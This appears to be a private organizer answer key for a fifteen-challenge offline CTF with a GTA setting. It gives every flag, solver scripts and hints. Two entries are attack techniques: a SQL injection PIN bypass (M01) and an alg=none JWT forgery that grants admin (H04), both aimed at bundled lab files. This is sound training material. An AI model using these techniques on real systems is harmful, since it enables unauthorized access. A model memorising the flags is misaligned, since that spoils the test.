# PRIVATE ANSWER KEY · DO NOT DISTRIBUTE

**Security classification: organizer only.** Contains all 15 exact flags and exploitation walkthroughs for fictional offline labs. Do not upload to CTFd attachments, GitHub, or student shares. Command examples run **inside each mission folder** (e.g. `PARTICIPANT/MEDIUM/M01`). Correct score for each mission is listed below.

## E01 · Lester’s Pager Panic — 50 points

**Category:** Cryptography | **Location:** Lester’s Hideout  
**Correct flag:** `FLAG{vespucci_pager_27}`  
**Required evidence:** `dispatch.csv`

### Solving procedure

Open `dispatch.csv`, keep `courier=YES`, sort `seq` as **integers**, then Base64-decode each `payload_b64` separately and concatenate. Example:
```python
import csv,base64
r=list(csv.DictReader(open('dispatch.csv')))
print(''.join(base64.b64decode(x['payload_b64']).decode() for x in sorted((a for a in r if a['courier']=='YES'),key=lambda a:int(a['seq']))))
```

### Progressive hints (shown in CTFd)

1. The courier column identifies actual orders, not public broadcasts.
2. Order courier packets by numeric sequence before decoding.
3. Each payload is independently Base64-encoded; decode each and concatenate.

---

## E02 · Vinewood Shift Change — 50 points

**Category:** Cryptography | **Location:** Vinewood Boulevard  
**Correct flag:** `FLAG{vinewood_rot_shift}`  
**Required evidence:** `taxi_ledger.txt`

### Solving procedure

The only real mission row is MIDNIGHT. Four wheels plus spare implies **+5** for encryption, so decrypt with shift **−5**. Python:
```python
s=next(x.split(' | ',1)[1] for x in open('taxi_ledger.txt') if x.startswith('MIDNIGHT |'))
print(''.join(chr((ord(c)-65-5)%26+65) if 'A'<=c<='Z' else chr((ord(c)-97-5)%26+97) if 'a'<=c<='z' else c for c in s))
```

### Progressive hints (shown in CTFd)

1. Only the MIDNIGHT route is part of the job.
2. Four road wheels plus the one spare tell you the rotation.
3. Undo a shift of five letters on the MIDNIGHT ciphertext.

---

## E03 · Sandy Shores Hidden Stash — 50 points

**Category:** Linux forensics | **Location:** Sandy Shores  
**Correct flag:** `FLAG{hidden_stash_sandy}`  
**Required evidence:** `safehouse.zip`

### Solving procedure

Use `unzip safehouse.zip -d extracted`, then `ls -la extracted/safehouse`. The hidden `.drop_manifest` has `DROP_CODE_HEX=...`. Decode:
```bash
grep DROP_CODE_HEX extracted/safehouse/.drop_manifest | cut -d= -f2 | xxd -r -p
```

### Progressive hints (shown in CTFd)

1. Use unzip; then inspect the extracted directory, not the ZIP listing alone.
2. Try ls -la inside the safehouse folder.
3. The dotfile contains hex bytes; use xxd -r -p or bytes.fromhex().

---

## E04 · Del Perro Camera Roll — 50 points

**Category:** Digital forensics | **Location:** Del Perro Pier  
**Correct flag:** `FLAG{camera_metadata_trail}`  
**Required evidence:** `pier_camera.png`

### Solving procedure

Read PNG text metadata without re-saving the image. With Pillow:
```python
from PIL import Image
import base64
v=Image.open('pier_camera.png').info['dispatch_note']
print(base64.b32decode(v).decode())
```
Alternatively `exiftool pier_camera.png` if installed.

### Progressive hints (shown in CTFd)

1. PNG text metadata can carry notes separate from pixel data.
2. Inspect via exiftool, identify -verbose, or Pillow image.info.
3. Decode the Base32 string stored under dispatch_note.

---

## E05 · Wrong Extension, Right Exit — 50 points

**Category:** File forensics | **Location:** Los Santos Customs  
**Correct flag:** `FLAG{zip_in_plain_sight}`  
**Required evidence:** `customs_camera.jpg`

### Solving procedure

The JPEG extension is a trap; `file customs_camera.jpg` or `xxd -l 4 customs_camera.jpg` shows ZIP magic `PK`. Read the verified receipt:
```python
import zipfile,re
with zipfile.ZipFile('customs_camera.jpg') as z:
 s=z.read('customs/shipment_verified.txt').decode()
 print(bytes.fromhex(re.search(r'Drop-code \(hex\): ([0-9a-f]+)',s).group(1)).decode())
```

### Progressive hints (shown in CTFd)

1. File extensions can lie. Check the first bytes with file or xxd.
2. The bytes start with a ZIP signature; unzip the archive.
3. The verified receipt has a hex-encoded message. Decode it.

---

## M01 · Fleeca Vault Glitch — 100 points

**Category:** Web security | **Location:** Fleeca Bank  
**Correct flag:** `FLAG{fleeca_query_bypass}`  
**Required evidence:** `fleeca_kiosk.py`, `fleeca.db`

### Solving procedure

Launch only the included kiosk:
```bash
python fleeca_kiosk.py
```
Owner input: `' OR 1=1 --` . PIN: `xxxx`. The unsafe SQL is concatenated as `WHERE owner='<input>' AND pin='<input>' ...`; the quote and SQLite comment bypass the PIN check. The first local row is the protected audit record. Kiosk prints its decoded receipt. An unknown owner/PIN pair yields `Access denied`. Real servers are not in scope.

### Progressive hints (shown in CTFd)

1. Read the SQL query built inside fleeca_kiosk.py.
2. A quote can break out of the owner string; -- starts a SQLite comment.
3. Try an always-true condition in the owner field and a disposable PIN.

---

## M02 · Airport Ghost Flight — 100 points

**Category:** Network forensics | **Location:** Los Santos International Airport  
**Correct flag:** `FLAG{lsia_airwave_cargo}`  
**Required evidence:** `airport_dispatch.pcap`

### Solving procedure

Open `airport_dispatch.pcap` in Wireshark (offline). Filter HTTP requests; locate `X-Flight: LS-447`. Capture each `X-Chunk` numeric sequence and corresponding `X-Cargo` Base64 field, then decode each separately and join. There are **3** matching requests amid **22** IP/TCP frames. The private `validate_challenges.py` contains an independent standard-library PCAP parser verifying IPv4/TCP checksums.

### Progressive hints (shown in CTFd)

1. All traffic is unencrypted HTTP inside the provided capture.
2. Filter requests on X-Flight: LS-447, then sort X-Chunk numerically.
3. Each X-Cargo header is Base64 for one chunk of the answer.

---

## M03 · LSPD Midnight Audit — 100 points

**Category:** Log forensics | **Location:** Los Santos Police Department  
**Correct flag:** `FLAG{lspd_logbook_rebuilt}`  
**Required evidence:** `lspd_auth.log`, `CASE_BRIEF.txt`

### Solving procedure

Read `CASE_BRIEF.txt`. Filter `lspd_auth.log` for ALL: `case=714`, `host=lspd-evidence`, `account=case_clerk`, `source=FORENSIC`, `result=ACCEPT`. Sort `part` numerically; join `fraghex`; `bytes.fromhex`. Exactly six records form the correct evidence message, in 507 total lines.

### Progressive hints (shown in CTFd)

1. Correlate the case and identity markers in CASE_BRIEF.txt.
2. Keep case=714, host=lspd-evidence, account=case_clerk, source=FORENSIC, result=ACCEPT.
3. Sort part numbers before combining fraghex fields and converting hex to text.

---

## M04 · Underground XOR Radio — 100 points

**Category:** Cryptography | **Location:** Underground Market  
**Correct flag:** `FLAG{xor_radio_convoy}`  
**Required evidence:** `radio_packet.bin`, `checkpoint_keys.csv`

### Solving procedure

Sort CSV `stop` numerically, not lexicographically. Each `keybyte_hex` represents a key byte; XOR ciphertext with repeating key.
```python
import csv
r=list(csv.DictReader(open('checkpoint_keys.csv')))
k=bytes(int(z['keybyte_hex'],16) for z in sorted(r,key=lambda a:int(a['stop'])))
c=open('radio_packet.bin','rb').read()
print(bytes(v^k[i%len(k)] for i,v in enumerate(c)).decode())
```

### Progressive hints (shown in CTFd)

1. The CSV lists numeric stop order and one hexadecimal key byte per stop.
2. Build the key by sorting checkpoint_keys.csv on stop, then bytes.fromhex.
3. XOR each ciphertext byte with key[i % len(key)].

---

## M05 · Debugging the Dispatch — 100 points

**Category:** Programming | **Location:** Lester’s Hideout  
**Correct flag:** `FLAG{debug_the_dispatch}`  
**Required evidence:** `broken_dispatch.py`, `dispatch_packets.json`, `README_DEBUG.txt`

### Solving procedure

There are exactly three bugs in `broken_dispatch.py`. Change sorting key to `int(row['seq'])`, use `for row in ordered` (no `[:-1]`), and restore URL-safe Base64 padding. Correct function:
```python
def restore(packets):
 import base64
 ordered=sorted(packets,key=lambda row:int(row['seq']))
 encoded=''.join(row['fragment'] for row in ordered)
 return base64.urlsafe_b64decode(encoded+'='*(-len(encoded)%4)).decode()
```
Leave JSON untouched.

### Progressive hints (shown in CTFd)

1. Check how sequence numbers compare when left as strings.
2. The dispatcher must include every packet, including the last one.
3. URL-safe Base64 often needs missing padding restored.

---

## H01 · Zancudo Deadbolt — 160 points

**Category:** Reverse engineering | **Location:** Fort Zancudo Military Base  
**Correct flag:** `FLAG{zancudo_gate_unlocked}`  
**Required evidence:** `zancudo_gate`, `OPERATIONS.txt`

### Solving procedure

Use `file zancudo_gate` and `objdump -d -M intel zancudo_gate`; note the loop doing `argv[i] ^ (0x31 + 7*i)` and comparing against a twelve-byte table starting at ELF virtual address `0x402010`. `objdump -s -j .rodata zancudo_gate` shows the table. Recover each passcode byte as `table[i] ^ (0x31 + 7*i)`. The recovered twelve-character code is **`dockyard9472`**. Run:
```bash
chmod +x zancudo_gate
./zancudo_gate dockyard9472
```
A wrong 12-character code prints ACCESS DENIED. The executable decrypts the receipt only on a successful check. `ORGANIZER/validate_challenges.py` reconstructs the passcode from ELF segment offsets without reading private C source.

### Progressive hints (shown in CTFd)

1. Use file, strings, and objdump -d (or Ghidra). This is a Linux ELF.
2. The passphrase loop compares each input byte after a position-dependent XOR.
3. Invert the XOR against the 12 comparison constants, then run the binary with the recovered phrase.

---

## H02 · The Recursive Freeway — 160 points

**Category:** Algorithms | **Location:** Final Getaway  
**Correct flag:** `FLAG{2389a89b_378fbf1c}`  
**Required evidence:** `junctions.json`, `PROTOCOL.md`

### Solving procedure

Parse `junctions.json`. Use memoized recursion per `PROTOCOL.md`; terminal node yields `seed`, branch yields `((17*F(left)+31*F(right)+salt)^mask)&0xffffffff` (XOR occurs before AND). Compute `h=f"{F(destination):08x}"` and `SHA256(h ASCII).hexdigest()[:8]`, then build the specified format. Code:
```python
import json,hashlib,functools
j=json.load(open('junctions.json'))
@functools.lru_cache(None)
def F(n):
 a=j['junctions'][n]
 return a['seed'] if a['kind']=='terminal' else ((17*F(a['left'])+31*F(a['right'])+a['salt'])^a['mask'])&0xffffffff
h=f"{F(j['destination']):08x}"
print('FLAG{'+h+'_'+hashlib.sha256(h.encode()).hexdigest()[:8]+'}')
```

### Progressive hints (shown in CTFd)

1. Terminal nodes have literal values; branch nodes depend on two earlier nodes.
2. Memoize the function F(node) and apply the 32-bit mask at every branch.
3. The final flag is derived from the destination value and its SHA-256 suffix exactly as PROTOCOL.md specifies.

---

## H03 · Impound Evidence Matryoshka — 160 points

**Category:** Multi-stage forensics | **Location:** Los Santos Police Department  
**Correct flag:** `FLAG{impound_layers_found}`  
**Required evidence:** `impound_camera.png`, `EVIDENCE_NOTE.txt`

### Solving procedure

`impound_camera.png` is a valid PNG with a ZIP archive appended. Open it with Python `zipfile.ZipFile('impound_camera.png')` or `unzip`. Read `case_144/triage_144.gz` (not case 199), decompress GZIP, open inner TAR, read `sealed/dossier.json`, ASCII85 decode its payload and zlib decompress.
```python
import zipfile,gzip,tarfile,io,base64,zlib,json
with zipfile.ZipFile('impound_camera.png') as z: g=z.read('case_144/triage_144.gz')
with tarfile.open(fileobj=io.BytesIO(gzip.decompress(g))) as t: d=json.load(t.extractfile('sealed/dossier.json'))
print(zlib.decompress(base64.a85decode(d['payload'])).decode())
```

### Progressive hints (shown in CTFd)

1. A PNG may contain trailing bytes after IEND. Try zipfile or unzip on the PNG.
2. Within case_144, one .gz member holds a TAR archive.
3. Find dossier.json and Base85-decode then zlib-decompress the recorded payload.

---

## H04 · Fleeca Trust Fall — 160 points

**Category:** Secure code review | **Location:** Fleeca Bank  
**Correct flag:** `FLAG{unsigned_admin_trust}`  
**Required evidence:** `bank_gateway.py`, `guest.token`, `audit_vault.bin`, `AUDIT_BRIEF.txt`

### Solving procedure

Read `bank_gateway.py`. The vulnerability is algorithm confusion / **accepting unsigned `alg=none` tokens** because client-controlled `alg` bypasses HMAC verification. A guest token is valid but lacks `role=admin`. Forge a local unsigned token:
```python
import base64,json,subprocess,sys
enc=lambda x:base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()
token=enc({'alg':'none','typ':'JWT'})+'.'+enc({'sub':'auditor','role':'admin'})+'.'
subprocess.run([sys.executable,'bank_gateway.py','--token',token],check=True)
```
Mitigation: server-controlled allowed algorithm list (reject none), validated cryptographic signature, validated issuer/audience, and access control independent of untrusted claims. Never replay this technique on real systems.

### Progressive hints (shown in CTFd)

1. The token has three dot-separated Base64URL segments.
2. Review the alg=none branch and the role assertion.
3. Forge a token whose header selects none and whose payload claims role=admin. The gateway accepts an empty signature.

---

## H05 · Last Ride Out — 160 points

**Category:** Multilayer cryptography | **Location:** Final Getaway  
**Correct flag:** `FLAG{los_santos_final_escape}`  
**Required evidence:** `getaway_routes.csv`, `intercept.txt`, `LAYER_NOTES.md`

### Solving procedure

From `getaway_routes.csv` exactly one car qualifies: `wanted=0`, `clearance=YES`, `fuel_km>=route_km`: the Sentinel with plate `LSX-417`, terminal `DESERT`. Derive `sha256(b'LSX-417:DESERT').digest()` as repeating XOR key. Get text between packet markers, reverse sender order: ASCII85 decode, zlib decompress, repeated XOR.
```python
import base64,zlib,hashlib
s=open('intercept.txt').read().split('---BEGIN-PACKET---')[1].split('---END-PACKET---')[0].strip()
data=zlib.decompress(base64.a85decode(s))
key=hashlib.sha256(b'LSX-417:DESERT').digest()
print(bytes(c^key[i%len(key)] for i,c in enumerate(data)).decode())
```

### Progressive hints (shown in CTFd)

1. Select only a vehicle with wanted=0, fuel_km>=route_km and clearance=YES.
2. Use SHA-256 of PLATE:TERMINAL as the repeating XOR stream key.
3. Reverse the packet order: Base85 decode, zlib decompress, then XOR with the derived digest bytes.

---

